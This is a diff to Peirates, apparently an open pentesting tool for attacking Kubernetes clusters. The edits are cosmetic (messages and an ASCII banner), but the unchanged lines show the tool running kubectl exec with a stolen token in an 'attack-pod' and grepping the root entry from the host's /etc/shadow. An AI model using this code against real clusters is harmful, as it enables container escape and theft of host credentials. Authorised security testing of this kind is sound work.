@@ -107,7 +107,7 @@ func get_pod_list(connectionString config.ServerInfo) []string {
 func getHostname(connectionString config.ServerInfo, PodName string) string {
 	pod_hostname, err := exec.Command("kubectl", "-n", connectionString.Namespace, "--token="+connectionString.Token, "--certificate-authority="+connectionString.CAPath, "--server=https://"+connectionString.RIPAddress+":"+connectionString.RPort, "exec", "-it", PodName, "hostname").Output()
 	if err != nil {
-		fmt.Println("Checking for hostname of pod "+PodName+" failed: ", err)
+		fmt.Println("- Checking for hostname of pod "+PodName+" failed: ", err)
 		return "- Pod command exec failed for " + PodName + "\n"
 	} else {
 		return "+ Pod discovered: " + string(pod_hostname)
@@ -262,7 +262,7 @@ spec:
 		log.Fatal(err)
 	} else {
 		attack_pod_name := "attack-pod-" + random_string
-		println("Executing code in " + attack_pod_name)
+		println("Executing code in " + attack_pod_name + " to get its underlying host's root password hash")
 		time.Sleep(2 * time.Second)
 		shadow_file_bs, err := exec.Command("kubectl", "-n", connectionString.Namespace, "--token="+connectionString.Token, "--certificate-authority="+connectionString.CAPath, "--server=https://"+connectionString.RIPAddress+":"+connectionString.RPort, "exec", "-it", attack_pod_name, "grep", "root", "/root/etc/shadow").Output()
 		if err != nil {
@@ -287,7 +287,37 @@ func main() {
 	var connectionString config.ServerInfo = config.Builder()
 
 	// Run the option parser to initialize connectionStrings
-	println("\n\nStarting periates...")
+	println(`Peirates
+	________________________________________
+	,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+	,,,,,,,,,,,,,.............:,,,,,,,,,,,,,
+	,,,,,,,,,,...,IIIIIIIIIII+...,,,,,,,,,,,
+	,,,,,,,:..~IIIIIIIIIIIIIIIIII...,,,,,,,,
+	,,,,,,..?IIIIIII.......IIIIIIII..,,,,,,,
+	,,,,,..IIIIIIII...II?...?IIIIIII,..,,,,,
+	,,,:..IIIIIIII..:IIIIII..?IIIIIIII..,,,,
+	,,,..IIIIIIIII..IIIIIII...IIIIIIII7.:,,,
+	,,..IIIIIIIII.............IIIIIIIII..,,,
+	,,.=IIIIIIII...~~~~~~~~~...IIIIIIIII..,,
+	,..IIIIIIII...+++++++++++,..+IIIIIII..,,
+	,..IIIIIII...+++++++++++++:..~IIIIII..,,
+	,..IIIIII...++++++:++++++++=..,IIIII..,,
+	,..IIIII...+....,++.++++:+.++...IIII..,,
+	,,.+IIII...+..,+++++....+,.+...IIIII..,,
+	,,..IIIII...+++++++++++++++...IIIII..:,,
+	,,,..IIIII...+++++++++++++...IIIII7..,,,
+	,,,,.,IIIII...+++++++++++...?IIIII..,,,,
+	,,,,:..IIIII...............IIIII?..,,,,,
+	,,,,,,..IIIII.............IIIII..,,,,,,,
+	,,,,,,,,..7IIIIIIIIIIIIIIIII?...,,,,,,,,
+	,,,,,,,,,:...?IIIIIIIIIIII....,,,,,,,,,,
+	,,,,,,,,,,,,:.............,,,,,,,,,,,,,,
+	,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+	,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+	________________________________________`)
+
+	println("\n\nPeirates v1.00 by InGuardians")
+	println("https://www.inguardians.com/labs/\n")
 	parseOptions(&connectionString)
 
 	if inAPod(connectionString) {
